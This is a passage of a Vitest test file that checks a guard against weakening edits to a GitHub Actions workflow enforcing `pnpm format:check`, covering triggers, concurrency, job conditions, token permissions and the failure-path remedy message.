import { describe, it, expect } from 'vitest'
import { existsSync, readFileSync } from 'fs'
import {
  checkFormatWorkflow,
  checkThisRepoFormatWorkflow,
  extractRunBlocks,
  FORMAT_CHECK_SCRIPT,
  FORMAT_WORKFLOW,
} from './format-workflow-composition'

// #413. `pnpm format:check` was enforced by the husky pre-push hook and NOWHERE
// else: `--no-verify`, or a contributor whose hooks are not installed, landed
// unformatted code with every CI check green. The remedy is a dedicated
// `.github/workflows/format.yml` — and a YAML-only change has nothing asserting
// its shape unless a guard reads the real file.
//
// The failure modes this guard exists for are all one-line edits that keep the
// workflow LOOKING like enforcement:
//   - a `paths-ignore:` key (the reason this is not a job inside ci.yml, whose
//     workflow-level `paths-ignore: ['.changeset/**']` a job would inherit), or
//     its allow-list twin `paths:`, which excludes everything it does not list,
//   - a trigger narrowed off the base branch (`pull_request.branches: [release]`,
//     or its negative spelling `branches-ignore: [main]`) or off the events that
//     matter (`types: [closed]`),
//   - `pull_request_target` instead of `pull_request` (a fork PR would then run
//     with the base repo's credentials),
//   - a write-mode formatter step (`pnpm format`), which would make CI rewrite
//     files instead of reporting — the ADL 2026-07-31 ban is repo-wide, not
//     hook-specific,
//   - dropping the `push: main` trigger, so drift on the base branch goes unseen,
//   - dropping `concurrency`, so a superseded run keeps reporting a stale verdict,
//   - `continue-on-error: true`, ANY `if:` on the job, ANY `needs:` on the job (the
//     same neutralization with no condition written anywhere: a job whose dependency
//     fails or is skipped never runs, and a skipped job's required check reads
//     SUCCESSFUL), ANY `if:` on the step that runs `format:check` (a `failure()`
//     guard included — it is false on a normal PR, so the check is skipped and the
//     job ends green), a step `if:` elsewhere that is not a SCOPED `failure()` guard,
//     or a write-scoped token — each keeps the check green (or absent) while the
//     context still reports,
//   - dropping the failure-path remedy, so a red check names the offending file
//     and nothing a contributor can act on (AC1) — or widening ANY failure-path
//     step past the check step's own outcome, or naming that outcome without
//     COMPARING it to `'failure'` (`== 'success'` is false exactly when the check
//     failed), so a broken `pnpm install` is annotated "not formatted" or the remedy
//     never fires at all, or placing a correctly-SPELLED scope where it cannot
//     RESOLVE (a second job, or above the check step), so it is false on every run,
//     or leaving the comparison exactly right but letting it DECIDE nothing — `&&`
//     binds tighter than `||`, so `failure() && <scope> || <anything>` fires the
//     remedy on runs the check passed,
//   - respelling a trigger as a FLOW mapping, which the block reader sees as an
//     empty block and therefore as "no filter at all" — the spelling all four
//     trigger holes above walk through untouched — or respelling a STEP the same
//     way (`- { uses: creyD/prettier_action@v4 }`), which is a sequence ITEM and so
//     is invisible to the key-level sweep, to `usesProblems` and to the write-mode
//     scan at once,
//   - a formatting action (`uses:`), invisible to a write scan that reads `run:`
//     blocks, and needing no permission at all when placed before the check,
//   - a checking command that is not THE command (`--filter=`, `-s`, a `cd`), so CI
//     checks a strict subset of the tree the developer checks,
//   - renaming the job that RUNS the check, which deletes the `format` status
//     context branch protection is told to require — or leaving a decoy `format:`
//     job behind that only echoes, so that context reports SUCCESS while the real
//     check publishes one nobody requires — or renaming it through `name:` (GitHub
//     publishes the DISPLAY name, id only when `name:` is absent) or suffixing it
//     through a matrix (`format (20)`), or giving another job `name: format`,
//   - a `push:` filtered by `tags:` alone, which GitHub fires for tag refs only — the
//     workflow never runs on a push to `main` and `branchesOf` read "no filter" as
//     "every branch",
//   - a `concurrency.group` not keyed on `github.ref`, which puts a PR push and an
//     in-progress run on `main` in ONE group and cancels the latter,
//   - a `#` inside quotes read as a comment, which cuts an executing command out of
//     the guard's view,
//   - the checkout's `with:` — `ref: main` checks out `main` instead of the PR merge
//     ref (measured: an unformatted PR, `format` SUCCESS), `sparse-checkout` a subset,
//   - `working-directory:` on the checking step or `defaults:` anywhere — `cd` spelled
//     as a key, so CI runs a package's own `format:check` the moment one declares it,
//   - a remedy conjunct that narrows it to zero on the PR path (`&& github.event_name
//     == 'push'`: measured, check fails and the remedy is skipped),
//   - `cancel-in-progress` / `concurrency.group` matched as SUBSTRINGS, so `!(… ==
//     'pull_request')` and `format-${{ github.run_id }}-${{ github.ref }}` passed,
//   - an indentless block sequence or a filter-level alias reported as a DIFFERENT,
//     false problem ("no branch") instead of read or named,
//   - (round 13) the shell of the non-check, non-remedy steps left as the one deny-list
//     (`git checkout origin/main -- .` before the check was green), `prettier -w` missing
//     from the write list, and three correct spellings misreported (a quoted `run:`,
//     CRLF line endings, workflow-level `permissions:`).
// The module header is the rule inventory; this list is the failure modes the suites
// below are named after.
//
// Structure is asserted, never exact file text: cosmetic YAML edits (comments,
// step names, action versions) must not false-fail this guard.

/**
 * A workflow shaped like the one #413 lands. Each test breaks exactly ONE thing
 * in it by `replace`, so a failure names the property that regressed rather than
 * "the fixture changed".
 */
const WELL_FORMED = `name: Format

on:
  pull_request:
    branches:
      - main
  push:
    branches:
      - main

concurrency:
  group: format-\${{ github.ref }}
  cancel-in-progress: true

jobs:
  format:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      - name: Install pnpm
        uses: pnpm/action-setup@v4
        with:
          version: '10.15.0'
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'pnpm'
      - name: Install dependencies
        run: pnpm install
      - name: Check formatting
        id: format_check
        run: pnpm format:check
      - name: Explain how to fix it
        if: failure() && steps.format_check.outcome == 'failure'
        run: echo "::error::Not formatted. Run 'pnpm format' locally and commit the result."
`

/**
 * A mutation asserted to have HAPPENED, for every test that expects the guard to stay
 * GREEN through it.
 *
 * A positive-path `.replace` that matches nothing passes vacuously: rename `id:
 * format_check` in the workflow — an edit this guard permits, since `checkStepId` reads
 * whatever id is there — and "accepts a quoted `id:`" silently re-runs the guard on the
 * UNMUTATED file, still passes, and stops covering the `unquote` path that once made
 * this guard RED on a correct workflow. Nothing goes red to say so.
 *
 * A NEGATIVE-path test cannot fail this way — an unmutated well-formed workflow is
 * green, so `expect(ok).toBe(false)` catches the no-op replacement itself — which is why
 * only the green ones route through here.
 *
 * Asserted as "the needle is still there" rather than `mutated !== source`, because one
 * accepted spelling IS the shipped one (`uses: actions/checkout@v4` in the version
 * table): that row replaces text with itself and must stay covered.
 */
function mutate(source: string, from: string | RegExp, to: string, label = String(from)): string {
  expect(source, `the fixture no longer contains ${label}`).toMatch(from)
  return source.replace(from, to)
}

describe('extractRunBlocks reads what the workflow actually executes (#413)', () => {
  it('collects an inline `run:` command', () => {
    expect(extractRunBlocks('    steps:\n      - run: pnpm format:check\n')).toEqual([
      'pnpm format:check',
    ])
  })

  it('collects a block scalar body, not just its first line', () => {
    const blocks = extractRunBlocks(
      [
        '      - name: Check',
        '        run: |',
        '          set -e',
        '          pnpm format:check',
        '      - name: Next',
        '        uses: actions/checkout@v4',
        '',
      ].join('\n'),
    )
    expect(blocks).toEqual(['set -e\npnpm format:check'])
  })

  it('stops the block at the next key of the same or lower indent', () => {
    const blocks = extractRunBlocks(
      [
        '      - run: |',
        '          pnpm format:check',
        '      - uses: actions/checkout@v4',
        '',
      ].join('\n'),
    )
    expect(blocks).toEqual(['pnpm format:check'])
  })

  it('ignores commented-out steps, so a comment cannot smuggle a command in', () => {
    expect(
      extractRunBlocks('      # - run: pnpm format\n      - run: pnpm format:check\n'),
    ).toEqual(['pnpm format:check'])
  })
})

describe('the format workflow closes the trigger-shaped holes (#413)', () => {
  it('accepts the well-formed workflow', () => {
    const r = checkFormatWorkflow(WELL_FORMED)
    expect(r.ok, r.message).toBe(true)
  })

  // AC3. A `paths-ignore` is the hole this whole story exists to avoid: shipping a
  // check whose TRIGGER excludes paths reads as enforcement and is not.
  it('fails on a workflow-level `paths-ignore`', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:\n      - main',
        '  push:\n    branches:\n      - main\n    paths-ignore:\n      - .changeset/**',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('paths-ignore')
  })

  it('fails on a `paths-ignore` nested under any trigger', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:\n      - main',
        '  pull_request:\n    paths-ignore:\n      - docs/**\n    branches:\n      - main',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('paths-ignore')
  })

  // AC3, allow-list twin. `paths:` is the same hole spelled positively: everything
  // NOT listed is excluded. A markdown-only or `.changeset`-only PR would then run
  // no formatting check at all — identical outcome to the `paths-ignore` above.
  it('fails on a `paths:` allow-list under pull_request', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:',
        "  pull_request:\n    paths: ['**/*.ts']\n    branches:",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('paths')
  })

  it('fails on a `paths:` allow-list under push', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:',
        "  push:\n    paths: ['**/*.ts']\n    branches:",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('paths')
  })

  // AC2, base-branch half. `branchesOf` was applied to `push` only, so retargeting
  // the PR trigger at a branch nobody opens PRs against silenced the check for
  // every real PR while the guard stayed green.
  it('fails when `pull_request` no longer covers the base branch', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:\n      - main',
        '  pull_request:\n    branches:\n      - release',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pull_request')
  })

  // AC2, base-branch NEGATIVE spelling. `branches-ignore` is the same filter written
  // the other way round, and a missing filter correctly means "every branch" — so
  // reading only `branches:` made this one-line edit invisible: no PR targeting main
  // is format-checked and the `format` context simply never reports.
  it('fails on a `branches-ignore` under pull_request', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:\n      - main',
        '  pull_request:\n    branches-ignore:\n      - main',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('branches-ignore')
  })

  it('fails on a `branches-ignore` under push', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:\n      - main',
        '  push:\n    branches-ignore: [main]',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('branches-ignore')
  })

  // Rejected outright rather than pattern-matched against `main`: the values are
  // globs, so `ma*` excludes the base branch too and no substring test would see it.
  it('fails on a `branches-ignore` that excludes the base branch by glob', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:\n      - main',
        '  pull_request:\n    branches-ignore:\n      - ma*',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('branches-ignore')
  })

  // AC7, the filter GitHub reads as a DIFFERENT ref kind. `branches` and `tags` are
  // two independent filters on one event, and the producer's rule (GitHub docs, "events
  // that trigger workflows" § push: "If you define only tags/tags-ignore or only
  // branches/branches-ignore, the workflow won't run for events affecting the undefined
  // Git ref") is measured on this repo: release.yml declares `push: tags: ['v*']` and
  // nothing else, and every one of its `push` runs is a tag — none is `main`, while
  // ci.yml ran on each of those days' pushes to `main`. So `push: tags:` with no
  // `branches:` never runs on any push to `main`, and `branchesOf` returning null —
  // "no filter, every branch" — was exactly wrong for it: the guard reported the
  // workflow well-formed while post-merge drift went unseen.
  it('fails on a `push` filtered by `tags:` alone', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:\n      - main',
        "  push:\n    tags:\n      - 'v*'",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('tags')
    expect(r.message).toContain('never runs on a push to any branch')
  })

  it('fails on a `push` filtered by `tags-ignore:` alone', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:\n      - main',
        "  push:\n    tags-ignore: ['v*']",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('tags-ignore')
  })

  // `tags:` is not a filter `pull_request` accepts at all; same fail-closed treatment,
  // since either way no PR against `main` is checked.
  it('fails on a `pull_request` filtered by `tags:` alone', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:\n      - main',
        "  pull_request:\n    tags:\n      - 'v*'",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('tags')
  })

  // Both filters defined: the same producer rule says the event fires for EITHER ref
  // kind, so `main` is still covered. Kept green so the rule rejects the hole, not the
  // word.
  it('accepts a `tags:` filter beside a `branches:` filter that covers the base branch', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  push:\n    branches:\n      - main',
        "  push:\n    branches:\n      - main\n    tags:\n      - 'v*'",
        'the `push:` trigger',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts a `tags-ignore:` filter beside a `branches:` filter that covers the base branch', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  push:\n    branches:\n      - main',
        "  push:\n    tags-ignore: ['v*']\n    branches: [main]",
        'the `push:` trigger',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // A tag filter beside a branch filter that MISSES the base branch is still the
  // off-base-branch hole, reported as that and not as a tag problem.
  it('still reports the off-base-branch hole when a `tags:` filter sits beside it', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:\n      - main',
        "  push:\n    branches:\n      - release\n    tags:\n      - 'v*'",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('does not cover `main`')
  })

  // AC2, event half. `types: [closed]` runs the check only AFTER the PR is closed —
  // never while it is reviewable.
  it('fails when a `types:` narrowing drops opened/synchronize', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  pull_request:\n    branches:',
        '  pull_request:\n    types: [closed]\n    branches:',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('types')
  })

  it('accepts a `types:` list that still covers opened and synchronize', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  pull_request:\n    branches:',
        '  pull_request:\n    types: [opened, synchronize, reopened, ready_for_review]\n    branches:',
        'the `pull_request` trigger block',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // AC2. Without `pull_request` the check does not exist where it matters.
  it('fails when the `pull_request` trigger is gone', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('  pull_request:\n    branches:\n      - main\n', ''),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pull_request')
  })

  // AC5. `pull_request_target` runs with the BASE repo's token against the fork's
  // head — the classic fork-PR privilege escalation. One word from the safe form.
  it('fails on `pull_request_target`, whatever else the file says', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('  pull_request:', '  pull_request_target:'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pull_request_target')
  })

  // AC7. Drift on the base branch must be visible, not only on pull requests.
  it('fails when the `push` trigger is gone', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('  push:\n    branches:\n      - main\n', ''))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('push')
  })

  it('fails when `push` no longer covers the base branch', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  push:\n    branches:\n      - main',
        '  push:\n    branches:\n      - release/*',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('main')
  })

  it('accepts the flow spelling of the branch filter (`branches: [main]`)', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        '  push:\n    branches:\n      - main',
        '  push:\n    branches: [main]',
        'the block-style `push` branch filter',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  // Duplicate-run edge case: `push` + `pull_request` queue two runs of the same
  // head, and the mitigation is a one-line block that is equally easy to drop.
  it('fails when the concurrency guard is dropped', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        'concurrency:\n  group: format-${{ github.ref }}\n  cancel-in-progress: true\n\n',
        '',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('concurrency')
  })

  it('fails when concurrency no longer cancels the superseded run', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('cancel-in-progress: true', 'cancel-in-progress: false'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('cancel-in-progress')
  })

  // Two merges to `main` a minute apart share `format-refs/heads/main`, so an
  // unconditional cancel throws away the FIRST commit's verdict — AC7 wanted drift
  // on the base branch visible. Cancelling only PR runs keeps both properties.
  it('accepts a cancel-in-progress conditioned on the pull_request event', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
        'cancel-in-progress: true',
        "cancel-in-progress: ${{ github.event_name == 'pull_request' }}",
        '`cancel-in-progress: true`',
      ),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('fails on a cancel-in-progress expression naming no event at all', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        'cancel-in-progress: true',
        "cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('cancel-in-progress')
  })

  // The accepted-expression rule is an ALLOW-list of equality, not a substring test
  // for `pull_request`: the NEGATION contains that substring and inverts the
  // mitigation, producing BOTH failure modes the rule exists for — three pushes to a
  // PR branch keep three runners alive on a stale verdict, and two merges to `main` a
  // minute apart leave the first commit with no formatting verdict at all.
  it('fails on a cancel-in-progress that NEGATES the pull_request event', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        'cancel-in-progress: true',
        "cancel-in-progress: ${{ github.event_name != 'pull_request' }}",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('cancel-in-progress')
  })

  // The `github.ref` keying is what the whole concurrency argument stands on — "the
  // two triggers never meet" is only true because a PR run is `refs/pull/<n>/merge` and
  // a push to main is `refs/heads/main`. Nothing read `group:`. So `group: format` (or
  // `${{ github.workflow }}`) put EVERY run in one group: a `push` run on main in
  // progress, any PR push then joins that group with `cancel-in-progress` true (the
  // event is `pull_request`) and cancels main's run — that commit ends with no
  // formatting verdict, the AC7 loss the conditional cancel exists to prevent — and two
  // PRs pushed a minute apart cancel each other's verdict. Same-group cancellation is
  // measured, not inferred: runs 33527856271 and 33528146034 of the shipped workflow
  // are `cancelled` because a later push to the same PR ref joined their group.
  it('fails when the concurrency group is a constant', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('group: format-${{ github.ref }}', 'group: format'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('group: format`')
    expect(r.message).toContain('github.ref')
  })

  it('fails when the concurrency group is keyed on the workflow name only', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('group: format-${{ github.ref }}', 'group: ${{ github.workflow }}'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('github.ref')
  })

  // The token outside `${{ }}` is the literal string `github.ref`, i.e. a constant.
  it('fails when `github.ref` is written outside an expression', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('group: format-${{ github.ref }}', 'group: format-github.ref'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('github.ref')
  })

  // Allow-list of the canonical spelling, as for `cancel-in-progress`: a different
  // context that happens to START with `github.ref` is not the same key. `ref_name` is
  // `<n>/merge` for a PR and the bare branch name for a push; `head_ref` is EMPTY on a
  // push, so every push to main shares `format-` — and `sha` never groups two runs at
  // all, so nothing is ever superseded.
  it('fails on the near-miss contexts `github.ref_name`, `github.head_ref` and `github.sha`', () => {
    for (const group of [
      'group: format-${{ github.ref_name }}',
      'group: format-${{ github.head_ref }}',
      'group: format-${{ github.sha }}',
    ]) {
      const r = checkFormatWorkflow(WELL_FORMED.replace('group: format-${{ github.ref }}', group))
      expect(r.ok, group).toBe(false)
      expect(r.message, group).toContain('github.ref')
    }
  })

  it('fails when the concurrency block declares no group at all', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('  group: format-${{ github.ref }}\n', ''))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('group')
  })

  // Correct spellings — a workflow-distinguishing prefix (a constant or the workflow
  // name) followed by the ref key or its documented `head_ref || ref` fallback, quoted
  // or not — stay green.
  it('accepts every group spelling keyed on github.ref', () => {
    for (const group of [
      'group: ${{ github.workflow }}-${{ github.ref }}',
      'group: format-${{ github.head_ref || github.ref }}',
      'group: "format-${{ github.ref }}"',
    ]) {
      const r = checkFormatWorkflow(
        mutate(WELL_FORMED, 'group: format-${{ github.ref }}', group, 'the concurrency group'),
      )
      expect(r.ok, `${group}: ${r.message}`).toBe(true)
    }
  })
})

// Nothing asserted a single JOB-level property, so the check could be made
// advisory, skipped outright, or handed a write-scoped token while every trigger
// and step rule above stayed green — and the `format` context would still report.
describe('the format job cannot be made advisory, skipped or privileged (#413)', () => {
  it('fails on `continue-on-error: true`, which reports SUCCESS on unformatted code', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Check formatting\n',
        '      - name: Check formatting\n        continue-on-error: true\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('continue-on-error')
  })

  it('fails on an unconditionally false `if:`', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('  format:\n    runs-on:', '  format:\n    if: false\n    runs-on:'),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  // The rule is an ALLOW-list, and this is why: a deny-list of literal falses waves
  // through every never-true EXPRESSION, which is the spelling anyone would write.
  // The job never runs on a PR, and a skipped required check reports neutral.
  it('fails on a never-true job `if:` EXPRESSION, not just the literal false', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  format:\n    runs-on:',
        "  format:\n    if: github.event_name == 'workflow_dispatch'\n    runs-on:",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  // `needs:` is the UNGUARDED spelling of the job `if:` above. A job whose dependency
  // fails — or is itself skipped — never runs and is reported skipped, and on GitHub a
  // skipped job reports its required check as SUCCESSFUL
  // (github-implementation.md § Ordering). So once AC8 lists `format`, that context
  // reads green and the merge goes through with the formatting check never having
  // executed. Every other rule in this module stays green through it, exactly like the
  // job-level `if:` it sits beside.
  const PRECHECK = `  precheck:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Gate
        run: exit 1
`

  const dependencies: [string, string][] = [
    ['a scalar', '    needs: precheck\n'],
    ['a flow sequence', '    needs: [precheck]\n'],
    ['a block sequence', '    needs:\n      - precheck\n'],
  ]

  for (const [label, spelling] of dependencies) {
    it(`fails when the job that runs the check is gated by \`needs:\` spelled as ${label}`, () => {
      const r = checkFormatWorkflow(
        `${WELL_FORMED.replace('jobs:\n', `jobs:\n${PRECHECK}`).replace(
          '  format:\n    runs-on: ubuntu-latest\n',
          `  format:\n    runs-on: ubuntu-latest\n${spelling}`,
        )}`,
      )
      expect(r.ok, `${label}: ${r.message}`).toBe(false)
      expect(r.message, label).toContain('needs:')
    })
  }

  it('fails on `needs:` even with no failing job to depend on — the gating is the loss', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '  format:\n    runs-on: ubuntu-latest\n',
        '  format:\n    runs-on: ubuntu-latest\n    needs: setup\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('needs:')
  })

  // The worse half: the JOB runs on every PR, and only the one step that checks
  // anything is skipped — so the `format` context reports SUCCESS on unformatted
  // code while every other rule in the module stays green.
  it('fails on an `if:` that skips the checking STEP while the job still reports', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Check formatting\n',
        "      - name: Check formatting\n        if: github.event_name == 'push'\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  it('fails on an `if:` added to any other step, e.g. the install', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Install dependencies\n',
        '      - name: Install dependencies\n        if: false\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  // The hole an allow-list keyed on `failure()` ALONE still leaves open: the guard
  // permitted any condition containing `failure()`, on ANY step — including the one
  // step that checks anything. `if: failure()` there is never true on a normal PR
  // (every earlier step succeeded), so `Check formatting` is SKIPPED, the job ends
  // successful, and the `format` context reports SUCCESS on unformatted code. The
  // check step therefore carries NO condition at all.
  it('fails on `if: failure()` on the CHECK step itself', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Check formatting\n',
        '      - name: Check formatting\n        if: failure()\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  it('fails when `failure()` is ANDed onto a never-true event test on the check step', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Check formatting\n',
        "      - name: Check formatting\n        if: github.event_name == 'push' && failure()\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  // Worse than the other two: a step referencing its OWN `steps.<id>.outcome` reads
  // an unpopulated context, so `'' == 'failure'` is false on every event and the
  // check never runs at all — while spelling out the exact scoping the guard asks
  // the REMEDY for.
  it('fails when the check step scopes itself on its own outcome', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Check formatting\n',
        "      - name: Check formatting\n        if: failure() && steps.format_check.outcome == 'failure'\n",
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('if:')
  })

  // One correctly-scoped step must not license every other one: `failure()` on a
  // second annotation step is JOB-scoped, so a `pnpm install` dying on a lockfile
  // drift annotates the Checks tab "not formatted" over the real cause — exactly
  // the diagnosis the scoping rule exists to prevent, one step further out.
  it('fails on a SECOND failure-path step left unscoped beside a scoped remedy', () => {
    const r = checkFormatWorkflow(
      `${WELL_FORMED}      - name: Extra note
        if: failure()
        run: echo "::error title=Formatting check failed::not formatted"
`,
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not scoped')
  })

  it('fails on `if: failure()` added to the install step beside a scoped remedy', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '      - name: Install dependencies\n',
        '      - name: Install dependencies\n        if: failure()\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not scoped')
  })

  // AC5 is "safe on fork PRs by construction, not by review". This job runs
  // `pnpm install`, i.e. PR-authored lifecycle scripts; a write-scoped token in
  // reach of that is the whole exposure.
  it('fails on `permissions: write-all`', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        '    permissions:\n      contents: read\n',
        '    permissions: write-all\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('permissions')
  })

  it('fails on any write scope inside the permissions block', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('contents: read', 'contents: write'))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('permissions')
  })

  it('fails when the permissions block is deleted, so the repo default is inherited', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace('    permissions:\n      contents: read\n', ''),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('permissions')
  })

  it('accepts the empty and read-all spellings of "no write scope"', () => {
    for (const spelling of ['permissions: {}', 'permissions: read-all']) {
      const r = checkFormatWorkflow(
        mutate(
          WELL_FORMED,
          '    permissions:\n      contents: read',
          `    ${spelling}`,
          'the block-style `permissions:`',
        ),
      )
      expect(r.ok, `${spelling}: ${r.message}`).toBe(true)
    }
  })
})

// AC1: the failing check must name the offending file AND the remedy. Prettier's
// `--list-different` prints the file and suppresses its own "run with --write"
// line, so without a failure-path step the contributor this story exists for —
// hooks not installed, pushed with `--no-verify` — gets a bare filename.
describe('a failing format check tells the contributor what to run (#413)', () => {
  it('fails when no failure-path step names the remedy', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        / {6}- name: Explain how to fix it\n {8}if: failure\(\).*\n {8}run: .*\n/,
        '',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pnpm format')
  })

  it('does not accept `pnpm format:check` as the remedy', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        'echo "::error::Not formatted. Run \'pnpm format\' locally and commit the result."',
        'echo "::error::Not formatted. Run pnpm format:check locally."',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pnpm format')
  })

  it('does not accept a remedy printed unconditionally on the success path', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace(/^ {8}if: failure\(\).*\n/m, ''))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('pnpm format')
  })

  // `if: failure()` is JOB-scoped: it fires when ANY earlier step failed. A `pnpm
  // install` broken by a lockfile drift or a registry outage would be annotated
  // "not formatted. Run 'pnpm format'" — the contributor runs it, nothing changes,
  // and the real cause is buried under a confident wrong diagnosis.
  it('fails when the remedy is not scoped to the check step (a bare `if: failure()`)', () => {
    const r = checkFormatWorkflow(
      WELL_FORMED.replace(
        "        if: failure() && steps.format_check.outcome == 'failure'\n",
        '        if: failure()\n',
      ),
    )
    expect(r.ok).toBe(false)
    expect(r.message).toContain('not scoped')
  })

  it('fails when the check step carries no `id:` to scope the remedy against', () => {
    const r = checkFormatWorkflow(WELL_FORMED.replace('        id: format_check\n', ''))
    expect(r.ok).toBe(false)
    expect(r.message).toContain('id:')
  })

  // A quoted id is valid YAML, prettier-stable, and `steps.format_check.outcome`
  // resolves against it exactly the same on GitHub. Reading the scalar raw made the
  // guard red on a CORRECT workflow, with a message describing a file that does
  // declare a usable id — and a false-positive gate is the kind that gets deleted.
  it('accepts a quoted `id:` on the check step', () => {
    const r = checkFormatWorkflow(
      mutate(WELL_FORMED, 'id: format_check', "id: 'format_check'", '`id: format_check`'),
    )
    expect(r.ok, r.message).toBe(true)
  })

  it('accepts `conclusion` as well as `outcome` for the scoping', () => {
    const r = checkFormatWorkflow(
      mutate(
        WELL_FORMED,
